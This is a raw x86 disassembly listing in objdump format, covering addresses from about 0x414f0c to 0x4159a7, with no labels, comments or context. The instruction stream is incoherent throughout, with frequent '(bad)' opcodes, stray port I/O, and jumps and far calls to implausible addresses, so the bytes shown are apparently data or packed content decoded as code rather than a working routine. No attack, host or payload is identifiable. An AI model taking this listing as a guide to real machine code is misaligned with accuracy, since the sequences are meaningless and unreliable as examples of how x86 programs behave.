  414f0c:	add    BYTE PTR [eax],al
  414f0e:	lds    esp,FWORD PTR [esi-0x76d6fbd8]
  414f14:	mov    bh,0x5b
  414f16:	sbb    ebx,DWORD PTR [eax+0x1abc70a6]
  414f1c:	clc    
  414f1d:	jo     0x414ea1
  414f1f:	pop    es
  414f20:	imul   ebp,esi,0xd
  414f23:	pop    esp
  414f24:	fiadd  WORD PTR [esi+0x70871219]
  414f2a:	out    0xc8,al
  414f2c:	jge    0x414f9e
  414f2e:	lock test DWORD PTR [eax],eax
  414f31:	jmp    0x6f39d6a4
  414f36:	dec    eax
  414f37:	(bad)  
  414f38:	dec    ecx
  414f39:	test   al,0x3d
  414f3b:	adc    dh,BYTE PTR [ebp+ebx*2+0x4e]
  414f3f:	xchg   DWORD PTR [eax],ecx
  414f41:	inc    ecx
  414f42:	adc    al,0x9d
  414f44:	std    
  414f45:	dec    esi
  414f46:	out    dx,al
  414f47:	mov    al,0xc7
  414f49:	sub    eax,DWORD PTR [ecx+0x5b]
  414f4c:	push   ebx
  414f4d:	jb     0x414f60
  414f4f:	fcmovnb st,st(4)
  414f51:	adc    eax,0x5cfe1126
  414f56:	js     0x414f6e
  414f58:	push   ecx
  414f59:	es nop
  414f5b:	data16 std 
  414f5d:	aam    0xe8
  414f5f:	cdq    
  414f60:	aas    
  414f61:	jmp    0xe972754b
  414f66:	cmp    eax,0xc0f6c066
  414f6b:	sar    edi,0xe8
  414f6e:	cmp    eax,0xf1441a
	...
  414f9b:	add    BYTE PTR [ebx+ebx*2],bh
  414f9e:	add    cl,ch
  414fa0:	not    BYTE PTR [esi+0x5b41e6f4]
  414fa6:	add    BYTE PTR [ebx+0x3a],dl
  414fa9:	test   DWORD PTR [eax],eax
  414fab:	inc    ebx
  414fac:	inc    edx
  414fad:	test   DWORD PTR [eax],eax
  414faf:	pop    esp
  414fb0:	ja     0x414fc0
  414fb2:	push   ecx
  414fb3:	je     0x414f7c
  414fb5:	or     eax,0xa2a1bef6
  414fba:	std    
  414fbb:	cmp    al,0x9a
  414fbd:	adc    DWORD PTR [ebp+ebp*4-0x7e],esi
  414fc1:	lock xor cl,ch
  414fc4:	cmp    eax,0x4715c066
  414fc9:	add    al,0x73
  414fcb:	call   0x58a9ab0d
  414fd0:	ret    0x9a
  414fd3:	add    al,al
  414fd5:	adc    ecx,DWORD PTR [edx]
  414fd7:	call   0x40699c
  414fdc:	inc    edi
  414fdd:	xchg   esi,eax
  414fde:	int    0x8d
  414fe0:	pop    edx
  414fe1:	xchg   ebx,eax
  414fe2:	idiv   bh
  414fe4:	pusha  
  414fe5:	daa    
  414fe6:	push   eax
  414fe7:	call   0x4069fc
  414fec:	pop    esi
  414fed:	in     al,0xd9
  414fef:	div    DWORD PTR [eax-0x7e]
  414ff2:	in     eax,0x35
  414ff4:	jmp    0x414f76
  414ff6:	(bad)  
  414ff7:	push   0xffffffa7
  414ff9:	xor    eax,0x5dd668e2
  414ffe:	std    
  414fff:	mov    ch,0x0
	...
  415029:	add    BYTE PTR [ebx],dh
  41502b:	mov    bh,dh
  41502d:	jmp    DWORD PTR [eax+0x54]
  415030:	ror    DWORD PTR [eax-0x1a],cl
  415033:	pop    ebp
  415034:	call   0xfec2286e
  415039:	mov    DWORD PTR [edx],ebx
  41503b:	xchg   esi,esi
  41503d:	inc    DWORD PTR [eax+0x35]
  415040:	(bad)  
  415041:	addr16 dec esi
  415043:	das    
  415044:	inc    ecx
  415045:	add    BYTE PTR [eax-0x2e],dh
  415048:	fincstp 
  41504a:	push   eax
  41504b:	cmp    dh,0x35
  41504e:	call   0x4568:0x6f0040d5
  415055:	push   DWORD PTR [eax-0x72]
  415058:	test   ah,ch
  41505a:	push   0x276afe80
  41505f:	xor    eax,0x576668ec
  415064:	std    
  415065:	mov    ch,0xd3
  415067:	mov    esi,edi
  415069:	call   eax
  41506b:	push   ebx
  41506c:	ror    DWORD PTR [eax+0x66],cl
  41506f:	push   edi
  415070:	call   0xfec1aa6e
  415075:	mov    DWORD PTR [esi],edi
  415077:	jg     0x4150d2
  415079:	test   BYTE PTR [ecx],0xe2
  41507c:	xlat   BYTE PTR ds:[ebx]
  41507d:	jmp    DWORD PTR [ecx-0x6b]
  415080:	fld    DWORD PTR [eax+0x3e]
  415083:	xchg   ecx,eax
  415084:	mov    eax,0x6e89f1db
  415089:	(bad)  
  41508a:	sub    esp,edi
  41508c:	mov    ecx,0x40
	...
  4150b5:	add    BYTE PTR [eax],al
  4150b7:	add    BYTE PTR [esi],bh
  4150b9:	stos   BYTE PTR es:[edi],al
  4150ba:	dec    edx
  4150bb:	inc    ebp
  4150bc:	shl    DWORD PTR [ecx-0x4e1d7b84],1
  4150c2:	outs   dx,BYTE PTR ds:[esi]
  4150c3:	(bad)  
  4150c4:	push   esp
  4150c5:	add    bl,dl
  4150c7:	mul    DWORD PTR [esi]
  4150c9:	ret    
  4150ca:	add    edi,edi
  4150cc:	jmp    0x41513c
  4150ce:	jbe    0x4150ce
  4150d0:	test   eax,0xf6d53849
  4150d5:	ret    0xe801
  4150d8:	fcmovnb st,st(0)
  4150da:	outs   dx,BYTE PTR ds:[esi]
  4150db:	inc    bh
  4150dd:	ja     0x415140
  4150df:	test   BYTE PTR [ecx-0x6d437d97],0x69
  4150e6:	outs   dx,BYTE PTR ds:[esi]
  4150e7:	(bad)  
  4150e8:	ds mov ss,edx
  4150eb:	add    bl,BYTE PTR ds:[bx-0x43]
  4150f0:	imul   ecx,DWORD PTR [edi-0x3ddb1807],0xef59fe6e
  4150fa:	je     0x4150f2
  4150fc:	push   ecx
  4150fd:	xor    DWORD PTR [esp+esi*2+0x36],ebp
  415101:	sbb    bh,BYTE PTR [edi+0x3f]
  415104:	inc    ecx
  415105:	and    DWORD PTR [esp+esi*4+0x2a],ebp
  415109:	shr    DWORD PTR [ebx-0x2],1
  41510c:	xor    DWORD PTR [edi-0x4],eax
  41510f:	out    0xbe,eax
  415111:	inc    ecx
  415112:	imul   edi,esi,0x21
  415115:	xchg   DWORD PTR [esi+esi*8+0x19],ebx
  415119:	pop    ebx
  41511a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41511b:	ins    DWORD PTR es:[edi],dx
	...
  415144:	add    BYTE PTR [eax],al
  415146:	mov    ah,BYTE PTR [ebx-0x71]
  415149:	repnz dec ecx
  41514b:	adc    BYTE PTR [edi-0x69093593],dl
  415151:	ins    DWORD PTR es:[edi],dx
  415152:	clc    
  415153:	paddw  mm7,mm3
  415156:	fnstenv [esi+0x27]
  415159:	ins    DWORD PTR es:[edi],dx
  41515a:	call   0xe8a58e6e
  41515f:	movq   mm5,QWORD PTR [ebp+0x52]
  415163:	arpl   WORD PTR [edi-0x2a],cx
  415166:	adc    DWORD PTR [eax],edx
  415168:	pop    edi
  415169:	ins    DWORD PTR es:[edi],dx
  41516a:	xchg   edx,eax
  41516b:	cs pop edi
  41516d:	ins    DWORD PTR es:[edi],dx
  41516e:	ror    BYTE PTR [edi],0xd5
  415171:	sti    
  415172:	mov    eax,ds:0xb06d45da
  415177:	pcmpeqw mm2,QWORD PTR [eax-0x50]
  41517b:	getsec 
  41517d:	pop    esp
  41517e:	push   edi
  41517f:	pushf  
  415180:	cs ins DWORD PTR es:[edi],dx
  415182:	cwde   
  415183:	lds    edx,FWORD PTR [edi]
  415185:	jne    0x415117
  415187:	movups xmm1,XMMWORD PTR ds:0x6d170ffd
  41518e:	retf   0x16fe
  415191:	ins    DWORD PTR es:[edi],dx
  415192:	js     0x415196
  415194:	fadd   st(0),st
  415196:	jo     0x4151a7
  415198:	push   DWORD PTR [esi+0x6cf70761]
  41519e:	pop    ecx
  41519f:	popa   
  4151a0:	stos   BYTE PTR es:[edi],al
  4151a1:	ins    BYTE PTR es:[edi],dx
  4151a2:	pop    eax
  4151a3:	setge  BYTE PTR [edi+0x48]
  4151a7:	pandn  mm3,QWORD PTR [ebx+0x0]
	...
  4151d3:	add    BYTE PTR [ebx-0x64],cl
  4151d6:	(bad)  
  4151d7:	ins    BYTE PTR es:[edi],dx
  4151d8:	inc    eax
  4151d9:	(bad)
  4151dc:	cmp    BYTE PTR [edi],cl
  4151de:	shl    BYTE PTR [eax+0x7f],1
  4151e1:	push   cs
  4151e2:	mov    edi,0x113826c
  4151e7:	rcr    BYTE PTR ds:0xaaaefe11,0x87
  4151ee:	cld    
  4151ef:	xchg   ecx,eax
  4151f0:	adc    bh,BYTE PTR [esi]
  4151f2:	add    cl,ch
  4151f4:	inc    esp
  4151f5:	sbb    al,0x9
  4151f7:	jmp    0x6b2e33e4
  4151fc:	adc    DWORD PTR [edx],0xa417e96b
  415202:	std    
  415203:	hlt    
  415204:	in     eax,0xf6
  415206:	add    ebp,DWORD PTR [ecx]
  415208:	push   ebx
  415209:	or     eax,0x764e2488
  41520e:	ret    
  41520f:	sar    esp,1
  415211:	push   cs
  415212:	call   esp
  415214:	(bad)
  415217:	push   edi
  415218:	push   edx
  415219:	or     eax,0xd29d4fe
  41521e:	je     0x415211
  415220:	adc    eax,0x1a3e403e
  415225:	and    eax,ebx
  415227:	in     eax,dx
  415228:	cmp    eax,0xbe3d89a8
  41522d:	sbb    dh,ch
  41522f:	mov    BYTE PTR es:[edx-0x18],ah
  415233:	xchg   edi,eax
  415234:	sub    BYTE PTR [ebx+0x0],bl
  415237:	loop   0x415239
	...
  415261:	add    ch,bh
  415263:	xchg   BYTE PTR [eax+eiz*1],al
  415266:	jmp    DWORD PTR [ecx+0x0]
  415269:	push   es
  41526a:	push   0x4887e85e
  41526f:	pop    ebx
  415270:	add    dl,ah
  415272:	std    
  415273:	xchg   BYTE PTR [eax+eiz*1],al
  415276:	jmp    DWORD PTR [ecx+0x0]
  415279:	jo     0x4152fa
  41527b:	push   es
  41527c:	(bad)  
  41527d:	push   esp
  41527e:	(bad)  
  415280:	xchg   esp,eax
  415281:	sub    edx,ebp
  415283:	or     al,0x88
  415285:	and    al,0xa6
  415287:	or     eax,0x81fb0074
  41528c:	je     0x415286
  41528e:	call   0xbc29609e
  415293:	sar    dh,1
  415295:	call   FWORD PTR [edx+ebx*4]
  415298:	jno    0x4152d5
  41529a:	mov    ds,WORD PTR [edx+esi*8]
  41529d:	push   0x17
  41529f:	xchg   ebx,eax
  4152a0:	inc    esp
  4152a1:	hlt    
  4152a2:	inc    edi
  4152a3:	xor    BYTE PTR [esp+edi*8-0x41],0xaa
  4152a8:	push   0xffffffff
  4152aa:	mov    eax,0x174be0d
  4152af:	xor    bh,dh
  4152b1:	(bad)  
  4152b3:	sar    dh,0x75
  4152b6:	fbstp  TBYTE PTR [ecx-0x7da7c10a]
  4152bc:	(bad)  
  4152bd:	jne    0x41529a
  4152bf:	xor    BYTE PTR [eax+ecx*1+0x7f],0xd1
  4152c4:	inc    DWORD PTR ds:[eax]
	...
  4152ef:	add    BYTE PTR [eax],cl
  4152f1:	xor    BYTE PTR [esp+esi*8-0x8],0xb
  4152f6:	cli    
  4152f7:	push   edx
  4152f9:	adc    esi,esp
  4152fb:	adc    al,0xa8
  4152fd:	cmp    dh,0xff
  415300:	shl    BYTE PTR [ebp-0x1b],cl
  415303:	and    eax,0xc9fe80e5
  415308:	push   ebp
  415309:	adc    edi,esi
  41530b:	push   esp
  41530c:	sbb    al,0xb3
  41530e:	add    ah,0x33
  415311:	sub    edi,edi
  415313:	jne    0x415380
  415315:	mov    cl,0xee
  415317:	inc    esi
  415318:	push   0xe2c00a80
  41531d:	pop    edx
  41531e:	pop    esi
  41531f:	leave  
  415320:	and    eax,0x228cfe13
  415325:	xchg   DWORD PTR [ebp-0x1],ecx
  415328:	repnz adc ah,dh
  41532b:	mov    eax,ds:0xfe693d3e
  415330:	inc    ebp
  415331:	ret    0x83fa
  415334:	push   ds
  415335:	add    eax,DWORD PTR [edx]
  415337:	add    BYTE PTR [ecx],ch
  415339:	dec    eax
  41533a:	push   0x69403ae7
  41533f:	inc    bh
  415341:	aaa    
  415342:	pop    eax
  415343:	dec    BYTE PTR [ebx+0x1a746ab6]
  415349:	out    dx,al
  41534a:	lock not DWORD PTR [esi]
  41534d:	sbb    esp,eax
  41534f:	(bad)  
  415350:	stc    
  415351:	jns    0x415343
  415353:	jmp    0x415355
	...
  41537d:	add    bh,ah
  41537f:	mov    eax,ds:0x6a3e0001
  415384:	and    al,0x69
  415386:	jg     0x41538a
  415388:	shl    bh,1
  41538a:	mov    esp,ecx
  41538c:	add    DWORD PTR [eax],eax
  41538e:	inc    ebp
  41538f:	inc    edx
  415390:	lock add al,0xd7
  415393:	fiadd  DWORD PTR [ecx]
  415395:	add    BYTE PTR [esi],bh
  415397:	jns    0x41540a
  415399:	addr16 pop esi
  41539b:	sbb    eax,ebp
  41539d:	call   FWORD PTR [ecx+0x3e001588]
  4153a3:	add    DWORD PTR [edx-0x78],esi
  4153a6:	sub    ebx,DWORD PTR [edx-0x3cd8d027]
  4153ac:	add    DWORD PTR [esi-0x5a],edx
  4153af:	sub    BYTE PTR [eax],bl
  4153b1:	add    BYTE PTR [esi],bh
  4153b3:	or     DWORD PTR [edx+0x74],eax
  4153b6:	cmp    al,0x59
  4153b8:	out    dx,eax
  4153b9:	mov    DWORD PTR [esi+0x7a],ecx
  4153bc:	shl    dl,1
  4153be:	(bad)  
  4153bf:	mov    edi,0xeb2c675d
  4153c4:	(bad)  
  4153c5:	dec    DWORD PTR [ebx]
  4153c7:	pop    edx
  4153c8:	adc    al,0x2e
  4153ca:	ds add bh,bh
  4153cd:	mov    edi,0x5ce95acb
  4153d2:	jmp    0x2882:0xfdcd7df
  4153d9:	add    al,0x26
  4153db:	pushf  
  4153dc:	sti    
  4153dd:	add    edi,DWORD PTR [esi]
  4153df:	pop    eax
  4153e0:	mov    bh,0x7b
	...
  41540a:	add    BYTE PTR [eax],al
  41540c:	mov    dl,0x2f
  41540e:	push   eax
  41540f:	xor    al,0x97
  415411:	call   0x3fc:0xfc21d1e7
  415418:	ds pusha 
  41541a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41541b:	out    dx,eax
  41541c:	aas    
  41541d:	add    bl,ah
  41541f:	jge    0x415452
  415421:	jecxz  0x41545f
  415423:	push   ecx
  415424:	(bad)  
  415425:	xchg   ebp,eax
  415426:	scas   eax,DWORD PTR es:[edi]
  415427:	jge    0x4154a3
  415429:	imul   DWORD PTR [ebp+0x24e03e04]
  41542f:	dec    esp
  415430:	sti    
  415431:	pop    edx
  415432:	out    0x68,eax
  415434:	push   edx
  415435:	das    
  415436:	outs   dx,DWORD PTR ds:[esi]
  415437:	out    dx,eax
  415438:	(bad)  [ebx]
  41543a:	(bad)  
  41543c:	loope  0x415425
  41543e:	pop    ebp
  41543f:	imul   eax,eax,0xc464bce0
  415445:	xchg   ebp,eax
  415446:	inc    ebx
  415447:	jl     0x41548a
  415449:	loope  0x4153e7
  41544b:	push   eax
  41544c:	mov    ah,0x95
  41544e:	pop    ds
  41544f:	jl     0x415482
  415451:	fcomi  st,st(5)
  415453:	add    ecx,DWORD PTR [ecx-0x2a]
  415456:	xchg   ebx,eax
  415457:	push   0xef270b90
  41545c:	xchg   ebp,eax
  41545d:	add    cl,al
  41545f:	ret    0xb80
  415462:	gs mov edi,0xb8ffaa69
  415468:	clc    
  415469:	or     eax,DWORD PTR [edi]
  41546b:	pop    ebp
  41546c:	imul   ebp,DWORD PTR [ebp+0x4630],0x0
	...
  41549a:	xor    eax,0xda9c005b
  41549f:	(bad)  
  4154a0:	std    
  4154a1:	je     0x4154ec
  4154a3:	repz pop ebx
  4154a5:	sub    al,0xd7
  4154a7:	or     al,0xa
  4154a9:	test   eax,0xea684251
  4154ae:	adc    al,0x9c
  4154b0:	add    BYTE PTR [ecx],bh
  4154b2:	xchg   edx,eax
  4154b3:	repz inc esp
  4154b5:	(bad)  
  4154b6:	xchg   esi,eax
  4154b7:	call   0x4100:0x4a8c3e68
  4154be:	inc    edx
  4154bf:	pop    ebx
  4154c0:	in     eax,dx
  4154c1:	outs   dx,DWORD PTR ds:[esi]
  4154c2:	cmc    
  4154c3:	outs   dx,BYTE PTR ds:[esi]
  4154c4:	sub    BYTE PTR [bp+si-0x55],al
  4154c8:	std    
  4154c9:	adc    al,0x2
  4154cb:	add    esp,DWORD PTR ds:0xe9096701
  4154d1:	mov    cl,0xfd
  4154d3:	or     esi,edi
  4154d5:	mov    al,0x83
  4154d7:	bound  eax,QWORD PTR [eax]
  4154d9:	adc    al,0x63
  4154db:	test   BYTE PTR [ecx+0x7461ad],0x3
  4154e2:	nop
  4154e3:	or     DWORD PTR [ecx+esi*8+0x65],esi
  4154e7:	add    al,0x3c
  4154e9:	pop    esi
  4154ea:	push   esi
  4154eb:	rol    DWORD PTR [ebx+0x55],cl
  4154ee:	fwait
  4154ef:	fs std 
  4154f1:	aam    0xb5
  4154f3:	add    ah,BYTE PTR [esi+eax*2+0xa6b0916]
  4154fa:	pop    ss
  4154fb:	(bad)
	...
  415527:	add    dl,cl
  415529:	or     esi,edi
  41552b:	cs jae 0x415594
  41552e:	std    
  41552f:	pushf  
  415530:	test   DWORD PTR [edx],eax
  415532:	nop
  415533:	push   ds
  415534:	push   ss
  415535:	or     DWORD PTR [ecx-0x17],ebp
  415538:	cmp    eax,0x7781befa
  41553d:	jae    0x41557e
  41553f:	add    BYTE PTR [edi+0x26],dl
  415542:	add    ebp,DWORD PTR [ecx-0x6a]
  415545:	pop    esi
  415546:	std    
  415547:	jne    0x4155a8
  415549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41554a:	(bad)  
  41554b:	imul   esp,DWORD PTR [eax-0x7e],0x826375fe
  415552:	je     0x41555c
  415554:	outs   dx,DWORD PTR ds:[esi]
  415555:	je     0x415593
  415557:	call   DWORD PTR [eax]
  415559:	dec    eax
  41555a:	mov    edi,0x8b2b2704
  41555f:	in     al,dx
  415560:	xchg   esi,eax
  415561:	fwait
  415562:	aad    0xf7
  415564:	loopne 0x4154e7
  415566:	mov    WORD PTR [ebp-0x2d],es
  415569:	push   DWORD PTR cs:[ebp-0xd]
  41556d:	xor    BYTE PTR [eax+ecx*1-0x51],0xeb
  415572:	sub    DWORD PTR [eax],eax
  415574:	pop    ss
  415575:	add    eax,0x9f6a0fbe
  41557a:	add    BYTE PTR [eax],al
  41557c:	out    0x48,eax
  41557e:	inc    esp
  41557f:	clc    
  415580:	xlat   BYTE PTR ds:[ebx]
  415581:	pop    ebp
  415582:	add    BYTE PTR [eax],al
  415584:	cwde   
  415585:	sbb    esi,edx
  415587:	(bad)  
  415588:	call   0xab55ea
	...
  4155b5:	add    bh,ah
  4155b7:	and    edi,esi
  4155b9:	imul   edx,edi,0x9a8cfe23
  4155bf:	jns    0x41560e
  4155c1:	lea    ebp,[edx]
  4155c3:	mov    esi,esi
  4155c5:	inc    DWORD PTR [eax]
  4155c7:	das    
  4155c8:	push   DWORD PTR [ebp-0x1]
  4155cb:	xor    DWORD PTR [esp+edi*8+0xf],0xa7002a2a
  4155d3:	add    al,0xbe
  4155d5:	je     0x415571
  4155d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155d8:	add    BYTE PTR [ecx],0x97
  4155db:	pop    ebp
  4155dc:	push   0xfe1ecfb1
  4155e1:	(bad)  
  4155e2:	ds out 0xf5,eax
  4155e5:	out    0xb6,eax
  4155e7:	mov    ah,0x66
  4155e9:	dec    BYTE PTR [esi]
  4155eb:	lea    edx,[esp+ecx*4-0x45]
  4155ef:	movq   mm7,mm6
  4155f2:	pop    ecx
  4155f3:	jecxz  0x4155c4
  4155f5:	out    0xa6,eax
  4155f7:	mov    ah,0x66
  4155f9:	(bad)  
  4155fa:	mov    bh,0x76
  4155fc:	dec    ecx
  4155fd:	test   BYTE PTR [ecx+0x28],0x5a
  415601:	std    
  415602:	jns    0x415635
  415604:	imul   edi,DWORD PTR ds:0xc69a,0x66f27f68
  41560d:	mov    ah,0x6
  41560f:	shl    BYTE PTR [esi-0x2],cl
  415612:	sbb    DWORD PTR [eax-0x4],ecx
  415615:	out    0x3f,eax
  415617:	xor    eax,0xfe65
	...
  415644:	mov    bh,0x77
  415646:	jno    0x41563e
  415648:	add    edx,ebp
  41564a:	xlat   BYTE PTR ds:[ebx]
  41564b:	jmp    DWORD PTR [ecx+0x59]
  41564e:	fild   DWORD PTR [eax+0x3e]
  415651:	fnstenv [eax+0x66e1f1d7]
  415657:	(bad)  
  415658:	imul   ecx,DWORD PTR [edx],0x5a
  41565b:	in     eax,0x7c
  41565d:	xchg   ecx,eax
  41565e:	data16 mov BYTE PTR [ebx-0x3601917a],bh
  415665:	sub    al,0x2
  415667:	push   0xffc52b4e
  41566c:	mov    eax,0xb1f649e7
  415671:	cdq    
  415672:	data16 je 0x4156ab
  415675:	stos   BYTE PTR es:[edi],al
  415676:	cmp    al,BYTE PTR [ecx-0x5f]
  415679:	dec    ecx
  41567a:	jl     0x415600
  41567c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41567d:	dec    ecx
  41567e:	data16 inc bl
  415681:	jg     0x4156c8
  415683:	test   BYTE PTR [ecx+0x19d3265b],0x82
  41568a:	nop
  41568b:	les    edi,FWORD PTR [ecx+0x9]
  41568e:	pop    ebp
  41568f:	dec    ebx
  415690:	push   0xf2660f08
  415695:	push   edx
  415696:	setp   bh
  415699:	pop    es
  41569a:	(bad)  
  41569b:	jnp    0x41565f
  41569d:	(bad)  
  41569e:	(bad)  
  41569f:	gs push eax
  4156a1:	jne    0x41568a
  4156a3:	fstp   TBYTE PTR [ebp+0x42872]
	...
  4156d1:	add    BYTE PTR [ecx-0x32],al
  4156d4:	mov    edi,0xd708386d
  4156d9:	out    dx,eax
  4156da:	cmp    ebx,esi
  4156dc:	ja     0x4156a0
  4156de:	sub    BYTE PTR [eax],cl
  4156e0:	jno    0x415761
  4156e2:	add    DWORD PTR [eax],edx
  4156e4:	mov    edi,0xb7c5bc65
  4156e9:	ins    DWORD PTR es:[edi],dx
  4156ea:	adc    BYTE PTR [eax],cl
  4156ec:	call   0x651debe0
  4156f1:	pop    eax
  4156f2:	or     BYTE PTR [eax],cl
  4156f4:	lahf   
  4156f5:	add    al,0x72
  4156f7:	jge    0x415763
  4156f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156fa:	(bad)  [edi]
  4156fc:	(bad)  
  4156fd:	gs jmp 0xe21d778e
  415703:	pop    es
  415704:	(bad)  
  415705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415706:	fmul   DWORD PTR [ebp+0x43d45bd7]
  41570c:	outs   dx,BYTE PTR ds:[esi]
  41570d:	gs enter 0x57cd,0x6d
  415712:	rol    BYTE PTR [edi],0x5f
  415715:	out    dx,eax
  415716:	dec    ecx
  415717:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415719:	daa    
  41571a:	mov    cl,0x7
  41571c:	dec    edi
  41571d:	scas   eax,DWORD PTR es:[edi]
  41571e:	xchg   ebp,eax
  41571f:	cmova  esp,DWORD PTR [ebp-0x60]
  415723:	(bad)  
  415724:	xlat   BYTE PTR ds:[ebx]
  415725:	pop    ebx
  415726:	inc    BYTE PTR [esi+0x0]
  415729:	sbb    ecx,DWORD PTR ss:[ecx]
  41572c:	mov    ah,0x41
  41572e:	sbb    ecx,DWORD PTR [ecx]
  415730:	(bad)  
  415731:	es xchg ecx,eax
  415733:	push   edi
  415734:	call   0x415813
	...
  41575d:	add    BYTE PTR [eax],al
  41575f:	add    BYTE PTR [ecx],ah
  415761:	or     dh,bh
  415763:	push   ss
  415764:	mov    eax,ds:0xe30ef623
  415769:	or     BYTE PTR [ebp+ecx*1-0x101f72d],dh
  415770:	push   0x26fae857
  415775:	or     dh,bh
  415777:	out    dx,al
  415778:	cwde   
  415779:	daa    
  41577a:	mul    dh
  41577c:	fimul  DWORD PTR [eax]
  41577e:	je     0x415779
  415780:	xchg   ebp,eax
  415781:	imul   edi,DWORD PTR [esi+edx*8],0xffffff9a
  415785:	add    eax,0xcfa2f974
  41578a:	fdivr  DWORD PTR [esi+0x34fe059a]
  415790:	sbb    bh,bh
  415792:	jb     0x41574b
  415794:	call   0xfe0d:0x7574fe05
  41579b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41579c:	gs cld 
  41579e:	ds sahf 
  4157a0:	bound  eax,QWORD PTR ds:0x56299b4
  4157a6:	inc    BYTE PTR [ecx-0x7902b786]
  4157ac:	pop    edx
  4157ad:	iret   
  4157ae:	in     al,dx
  4157af:	jbe    0x415813
  4157b1:	add    eax,0x61ba5e9
  4157b6:	(bad)  
  4157b7:	outs   dx,BYTE PTR ds:[esi]
  4157b8:	cwde   
  4157b9:	(bad)  
  4157ba:	cmc    
  4157bb:	pop    dx
  4157bd:	(bad)  
  4157be:	mov    edi,0xfe05231f
  4157c3:	pushf  
	...
  4157ec:	add    BYTE PTR [eax],al
  4157ee:	adc    DWORD PTR ds:0xd0054efe,ecx
  4157f4:	ds add al,bh
  4157f7:	jle    0x4157f7
  4157f9:	mov    ch,0x7
  4157fb:	ja     0x4157fb
  4157fd:	(bad)  
  4157fe:	jmp    edx
  415800:	cmp    edi,edi
  415802:	pop    eax
  415803:	jg     0x415849
  415805:	clc    
  415806:	cs iret 
  415808:	sti    
  415809:	call   FWORD PTR [eax+0x7f]
  41580c:	je     0x41580a
  41580e:	aas    
  41580f:	inc    edi
  415810:	daa    
  415811:	add    BYTE PTR [edi+0x41],dl
  415814:	mov    edi,0x8b15570c
  415819:	in     al,dx
  41581a:	in     al,0x45
  41581c:	stc    
  41581d:	push   0x67
  41581f:	and    al,0x4b
  415821:	call   edx
  415823:	add    esi,esp
  415825:	mov    ebp,0x89fe7a1c
  41582a:	bound  edi,QWORD PTR [ebx-0x2]
  41582d:	jne    0x41584e
  41582f:	repnz aaa 
  415831:	imul   edx,DWORD PTR [esi+0x5f],0x16c235fd
  415838:	inc    ecx
  415839:	add    bh,ch
  41583b:	mov    ds:0x79c8fffc,al
  415840:	je     0x41584a
  415842:	jg     0x4158a9
  415844:	addr16 inc ecx
  415846:	pop    ss
  415847:	repnz (bad) 
  415849:	jmp    edi
  41584b:	fxam   
  41584d:	loop   0x415819
  41584f:	jns    0x41584f
  415851:	inc    DWORD PTR [eax]
	...
  41587b:	add    BYTE PTR [edx+0x7b],dl
  41587e:	(bad)  
  41587f:	jne    0x415870
  415881:	jno    0x415850
  415883:	cmp    ebx,DWORD PTR [eax+0x7a]
  415886:	enter  0xe3c2,0x59
  41588a:	push   ebx
  41588b:	mov    ecx,DWORD PTR [ebx-0x22]
  41588e:	sar    esp,0xed
  415891:	pop    ecx
  415892:	push   0x4c
  415894:	sbb    BYTE PTR [esi+eax*1],ah
  415897:	call   0xff6080da
  41589c:	test   eax,0x16fbc77a
  4158a1:	hlt    
  4158a2:	add    edi,ebp
  4158a4:	fsubr  DWORD PTR [ebx]
  4158a6:	jne    0x415910
  4158a8:	push   ebx
  4158aa:	jmp    0x1f4704a
  4158af:	dec    DWORD PTR [ebx]
  4158b1:	or     al,0x6a
  4158b3:	pop    esi
  4158b4:	loope  0x41591a
  4158b6:	popa   
  4158b7:	(bad)  
  4158b8:	jmp    0x415929
  4158ba:	popa   
  4158bb:	je     0x4158f3
  4158bd:	pop    esp
  4158be:	ja     0x4158fa
  4158c0:	popa   
  4158c1:	pop    esp
  4158c2:	dec    ebx
  4158c3:	rol    DWORD PTR [edx-0xc],0xb8
  4158c7:	mov    ah,BYTE PTR [edx+0x72]
  4158ca:	dec    eax
  4158cb:	iret   
  4158cc:	push   ecx
  4158cd:	hlt    
  4158ce:	bound  ecx,QWORD PTR [ebx+edi*8-0x4c014e01]
  4158d5:	mul    BYTE PTR [edx+0x74]
  4158d8:	inc    esi
  4158d9:	sbb    dh,BYTE PTR [ecx]
  4158db:	sub    bh,BYTE PTR [esi]
  4158dd:	repnz push cs
  4158df:	rol    BYTE PTR [eax],0x0
	...
  41590a:	xor    DWORD PTR [edi-0x8],esi
  41590d:	add    DWORD PTR [esi],edi
  41590f:	repnz dec edx
  415911:	inc    esp
  415912:	push   ss
  415913:	repz add DWORD PTR [eax],eax
  415916:	ds mov ebp,0xf601f3c8
  41591c:	add    DWORD PTR [eax],eax
  41591e:	fs bnd jmp 0x415921
  415922:	addr16 bnd jmp 0x415925
  415926:	mov    edx,0xb34f583f
  41592b:	ja     0x415982
  41592d:	neg    cl
  41592f:	test   DWORD PTR [ecx+0x628a4bfe],esi
  415935:	je     0x415901
  415937:	fisub  DWORD PTR [edx+0x28]
  41593a:	ds pop ebx
  41593c:	out    0xe,eax
  41593e:	jle    0x4158cf
  415940:	in     al,0x6c
  415942:	mov    DWORD PTR [edx-0x19],ebx
  415945:	add    edx,DWORD PTR [esi]
  415947:	retf   0xc49f
  41594a:	mov    eax,ds:0xa60fbd05
  41594f:	stos   DWORD PTR es:[edi],eax
  415950:	test   al,0x62
  415952:	nop
  415953:	stos   DWORD PTR es:[edi],eax
  415954:	bound  esi,QWORD PTR [ebx]
  415956:	mov    edx,0x805a33de
  41595b:	add    al,0xb8
  41595d:	mov    ch,0x61
  41595f:	fwait
  415960:	test   al,0x62
  415962:	jo     0x415936
  415964:	ins    BYTE PTR es:[edi],dx
  415965:	cmp    esi,DWORD PTR [eax+0x4]
  415968:	packssdw mm1,mm3
  41596b:	inc    esi
  41596c:	push   es
  41596d:	bound  eax,QWORD PTR [eax]
	...
  415997:	add    bh,ah
  415999:	pop    edx
  41599a:	pop    DWORD PTR [esi-0x1a]
  41599d:	cdq    
  41599e:	out    0x62,eax
  4159a0:	xchg   edx,eax
  4159a1:	and    esi,edi
  4159a3:	popa   
  4159a4:	inc    eax
  4159a5:	add    al,0x5d
  4159a7:	or     al,0x26
